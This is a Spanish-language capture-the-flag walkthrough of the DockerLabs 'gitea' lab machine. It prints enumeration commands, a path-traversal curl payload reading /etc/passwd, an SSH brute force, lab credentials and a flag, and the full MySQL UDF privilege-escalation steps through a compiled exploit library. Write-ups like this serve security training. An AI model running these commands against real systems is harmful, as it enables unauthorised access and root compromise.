nmap: 22, 80, 3000

![image](https://github.com/user-attachments/assets/19f5d5f2-4a90-4310-bbd4-14c4d074484e)

---

nos vamos a la pagina del puerto 80 y 3000

![image](https://github.com/user-attachments/assets/283cdfa3-b5ec-4a3c-991f-3de987903851)

![image](https://github.com/user-attachments/assets/cac418c6-5aa8-469d-b685-ca99582d7e5c)

en la pagina no hay mucho mas que información y en la pagina del puerto 3000 hay una versión pero no hay exploit de esa versión, solo de la 1.22.4 que es la versión anterior.
en el código fuente hay unos puntos importantes

![image](https://github.com/user-attachments/assets/ce7b0baa-b7cc-4ba5-bb70-d78531b01a98)

primero un URL que si la ingresamos a hosts nos enviara otra vez a la pagina del puerto 3000, y abajo hay un  "csrftoken"  con un código, pero la verdad que el código da unos números pero probablemente hay un login. 
ahora probando otra vez con la URL que encontramos en el código fuente la vamos modificando, entonces ingresamos un "gitea.dl" y veremos que tenemos un login

![image](https://github.com/user-attachments/assets/43f97f17-701f-4f35-bda2-c011ac2f4b13)

como vemos en los login da algunas credenciales pero no funcionan pero por si acaso la vamos a guardar. 

     admin@gitea.com 
    PassAdmin123-

ahora haremos un FFUF

     ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://gitea.dl -H "Host: FUZZ.gitea.dl" -fs 13615 

![image](https://github.com/user-attachments/assets/2e7dbd84-4137-443e-a09d-0ee7009e42f5)

nos da "dev" lo agregamos al hosts y nos da esta pagina

![image](https://github.com/user-attachments/assets/05956581-0749-4020-8a5f-b92ce366fd05)

como no tenemos mucho hacemos un gobuster para descubrir mas si es que tiene mas

     gobuster dir -u http://dev.gitea.dl/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,html,py,txt -t 64


![image](https://github.com/user-attachments/assets/80e2421b-114a-4f26-9292-8999e4a9289f)

nos dio uno llamativo que es "search" 

![image](https://github.com/user-attachments/assets/a2bc71b8-baca-4f8c-90ad-9ff1cb6689f8)

probamos pero no da nada y como vimos al principio en el código fuente da una URL que contiene este usuario creo yo, lo añadimos al hosts

![image](https://github.com/user-attachments/assets/40987377-ac21-483e-9b77-f593b40f2a2c)

obtenemos esta pagina pero al final de la pagina da un nombre que podría ser un usuario, pero no tiene muchas cosas mas, así que le seguimos buscando y haciendo otro FFUF

![image](https://github.com/user-attachments/assets/672314d3-5037-410a-a274-971939e3554e)

    ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://s3cr3tdir.dev.gitea.dl -H "Host: FUZZ.s3cr3tdir.dev.gitea.dl" -fs 13615 

ahora hacemos lo mismo pero agregamos el "s3cr3tdir"

![image](https://github.com/user-attachments/assets/da39d60e-1ad4-425a-86db-9d23d4a835cc)

y como vemos tenemos lo mismo que vimos en el primer codigo que es el URL exactamente igual. 

![image](https://github.com/user-attachments/assets/e4ff1364-7c5e-4684-ab51-c989c3690ff7)

pero nos vamos a logear ahora para ver que hay. 

![image](https://github.com/user-attachments/assets/e2e4b9c1-e70a-4f24-83cb-7967c4ebb5f1)

nos iremos a explore y veremos esos 3 repositorios  y el que contiene un código es el 
myapp >> app.py

![image](https://github.com/user-attachments/assets/d7fe65e3-4e5b-4ad5-b287-4a5427fbac17)

y en esta linea tiene una vulnerabilidad

![image](https://github.com/user-attachments/assets/80bab679-f105-4f05-9313-42f17fe260ff)

a esa vulnerabilidad se le puede realizar un "path traversal" en la pagina principal o sea gitea.dl, así que podemos descargar archivos con esa vulnerabilidad o lograr visualizar 

lanzamos 

     curl "http://gitea.dl/download?filename=../../../../../etc/passwd"

![image](https://github.com/user-attachments/assets/84fca510-da6f-4769-a0da-0971b91dd0e2)

y vemos que nos entrega la información que esperamos, buscamos en los otros archivos otras funciones o códigos y encontramos esto

![image](https://github.com/user-attachments/assets/9f7db90f-7928-4ee7-a5fc-16f780298705)

probamos lo mismo pero con el código de info.txt

![image](https://github.com/user-attachments/assets/bf1346cf-0dd1-4ade-b7f4-223ea0709eaa)

nos da un error así que probamos, pero nos dice que hay un archivo de la información en /opt así que probamos suerte

![image](https://github.com/user-attachments/assets/ba45147a-eb4a-46da-b6af-ae6db5f9a380)

se logra la magia y tenemos usuarios y contraseñas como textos. pero no creo que esos son los usuarios reales, así que vamos hacer un ataque de fuerza bruta. 

creamos una carpeta con las contraseñas y hacemos una fuerza bruta con el usuario "designer" que es el usuario del git donde están los códigos. 

![image](https://github.com/user-attachments/assets/12dd3a10-60c2-4949-9c95-ef7ceb5c8e35)

obtenemos la contraseña de "ssh"

![image](https://github.com/user-attachments/assets/284c3fce-a6ca-43b9-86eb-412d780ece0a)

ingresamos con las credenciales y tenemos la flag de user

     4683f3b0c2f083bb9588370c0f8ab284

![[dockerlabs/medio/gitea/test23.png]]

como se ve tenemos un puerto abierto de forma local "127.0.0.1:3306"  y 3306 funciona con mysql y tenemos credenciales de un login así que probamos entrar a la base de datos con las credenciales que nos dio el login

      admin@gitea.com 
    PassAdmin123-

     mysql -u admin -pPassAdmin123-


![[dockerlabs/medio/gitea/test24.png]]

tenemos acceso a la base de datos, vamos a realizar esta escalada: https://docs.databricks.com/gcp/en/udf/ (User-Defined Functions) UDF  lo que es pocas palabras

     técnica para escalar privilegios que consiste en cargar una librería compartida maliciosa con el fin de ejecutar código externo y definido por nosotros a nivel de sistema

entonces comenzamos con

    SHOW VARIABLES LIKE '%plugin_dir%';

![[dockerlabs/medio/gitea/test25.png]]

     SHOW VARIABLES LIKE '%secure_file_priv%';

![[dockerlabs/medio/gitea/test26.png]]

![[dockerlabs/medio/gitea/test27.png]]

ahora buscamos una vulnerabilidad o exploit basado en este ataque 

![[dockerlabs/medio/gitea/test28.png]]

nos sirve el primero así que lo tomamos

![[dockerlabs/medio/gitea/test29.png]]

dentro de se exploit contiene un código que intenta cargar códigos o archivos en "system()" así que vamos a pasarlo a la maquina victima

![[dockerlabs/medio/gitea/test30.png]]

ahora lanzamos estos comandos

    gcc -g -c 1518.c
      gcc -g -shared -Wl,-soname,exploit_udf.so -o exploit_udf.so 1518.o -lc

![[dockerlabs/medio/gitea/test31.png]]

tendremos los 3 documentos ahora movemos el exploit a plugins para que la cargue

     mv exploit_udf.so /usr/lib/mysql/plugin/

ahora nos vamos a la base de datos y nos conectamos creamos la función que haga referencia a la librería que agregamos o sea el exploit 

    CREATE FUNCTION do_system RETURNS STRING SONAME 'exploit_udf.so';

![[dockerlabs/medio/gitea/test32.png]]

entonces el exploit cargado podemos ejecutar comando a nivel sistema, podemos por ejemplo cargar una reverse shell hacia nuestro puerto para conectarnos directo a root 

![[dockerlabs/medio/gitea/root.png]]

somos root! 
